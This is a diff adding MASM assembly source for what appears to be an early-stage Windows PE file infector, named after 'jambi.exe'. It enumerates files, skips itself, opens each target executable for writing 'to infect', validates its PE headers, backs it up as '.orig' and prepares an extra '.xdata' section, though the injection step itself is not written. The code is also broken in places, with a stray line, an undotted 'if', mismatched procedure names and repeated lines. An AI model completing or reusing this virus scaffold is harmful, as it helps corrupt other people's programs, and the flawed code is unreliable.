@@ -1,0 +1,138 @@
+.data
+
+Err_SkipJambi		db  " -> Warning: jambi.exe has been skipped", 10, 0
+Err_EmptyFile		db  " -> Error: the file may be empty", 10, 0
+Err_FileValid   	db  " -> Success: file is valid!", 10, 0
+Err_FileInvalid 	db  " -> Error: file is invalid!", 10, 0
+
+NameExt                 db  ".orig",0
+MySectionName           db  ".xdata",0
+
+Filter      		db  "jambi.exe", 0
+
+.data?
+
+hFile			dd  ?
+hMapObject  		dd  ?
+uFileMap    		dd  ?
+NumberOfSections 	dd  ?
+buffer			db  512 dup(?)
+
+FileName          db  512 dup(?)
+NewFileName       db  512 dup(?)
+
+.code
+
+;;include             _mycode.asm
+
+_Align		proc	_dwSize,_dwAlign
+
+		push	edx
+		mov	eax,_dwSize
+		xor	edx,edx
+		div	_dwAlign
+		.if	edx
+			inc	eax
+		.endif
+		mul	_dwAlign
+		pop	edx
+		ret
+
+_Align		endp
+
+_IsJambiExe	proc
+
+	invoke	lstrcmp, addr FileName, addr Filter ;; comparing filename and jambi.exe string
+
+	push	eax ;; pushing the return value of compare function to use later
+
+	.if (eax==0) ;; testing if they are equals
+	    invoke	StdOut, addr Err_SkipJambi ;; printing error out
+	.endif
+
+	pop eax ;; getting compare function return value initially stored into stack
+	ret ;; return with the compare value
+
+_IsJambi	endp
+
+_Inject		proc	pData:DWORD ;; pData is a WIN32_FIND_DATA
+
+	mov	edi, pData
+	assume	edi:ptr WIN32_FIND_DATA
+
+	invoke	lstrcpy, addr FileName, addr [edi].cFileName ;; copying filename to a variable
+
+	invoke _IsJambiExe ;; testing if it is jambi.exe
+	if (eax==0)
+	   ret ;; we're stopping if true
+	.endif
+
+	invoke	StdOut, addr FileName ;; printing filename out without new line
+
+	invoke	CreateFile, addr FileName, GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ or FILE_SHARE_WRITE, NULL,OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL ;; opening the file to infect
+	mov	hFile, eax ;; storing the file handler to variable
+
+	invoke	CreateFileMapping, hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL ;; creating the file mapping
+	mov	hMapObject, eax ;; storing the mapping handler to variable
+
+	invoke	MapViewOfFile, hMapObject, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL ;; mapping a range of file
+	.if (eax==0) ;; testing if mapping failed
+	    invoke StdOut, addr Err_EmptyFile ;; printing error out
+	    ret ;; stopping program
+	.endif
+
+	mov	uFileMap, eax ;; we're storing base address to uFileMap
+k
+	;; check if the file is valid
+
+	mov	edi, uFileMap ;; edi is equal now to uFileMap
+	assume  edi:ptr IMAGE_DOS_HEADER ;; cast of edi
+
+	.if [edi].e_magic==IMAGE_DOS_SIGNATURE ;; testing if DOS mode
+	    add     edi, [edi].e_lfanew ;; adding e_lfanew offet to edi (uFileMap) to get PE header address
+            assume  edi:ptr IMAGE_NT_HEADERS ;; cast of edi
+
+	    .if [edi].Signature!=IMAGE_NT_SIGNATURE ;; testing Signature
+	    	jmp error_message ;; print out error message
+	    .endif
+     	.else
+	    jmp error_message ;; print out error message
+	.endif
+
+	mov	esi, edi ;; moving edi to esi (
+	assume	esi:ptr IMAGE_NT_HEADERS ;; cast of esi
+
+    ;; copy the orignal file and rename it
+    invoke  lstrcpy,addr NewFileName,addr FileName
+    invoke  lstrcat,addr NewFileName,addr NameExt
+    invoke  CopyFile,addr FileName,addr NewFileName,FALSE
+
+    movzx eax,[edi].FileHeader.NumberOfSections
+    mov NumberOfSections,eax
+
+    movzx eax,[edi].FileHeader.NumberOfSections
+    mov NumberOfSections,eax
+
+    ;;add edi, sizeof IMAGE_NT_HEADERS
+    ;;mov esi, NumberOfSections
+    ;;assume edi:ptr IMAGE_SECTION_HEADER
+
+    ;;.while esi>0
+	   ;;invoke lstrcpyn, addr buffer, addr [edi].Name1, IMAGE_SIZEOF_SHORT_NAME
+	   ;;invoke StdOut, addr buffer
+	   ;;invoke StdOut, addr Reached
+    	   ;;dec esi
+	   ;;add edi, sizeof IMAGE_NT_HEADERS
+    ;;.endw
+
+    ;;move to the end of file
+
+    invoke StdOut, addr Err_FileValid
+
+    ret ;; its a mandatory to stupid guys!!!
+
+error_message:
+invoke  StdOut, addr Err_FileInvalid
+ret
+
+_Inject endp
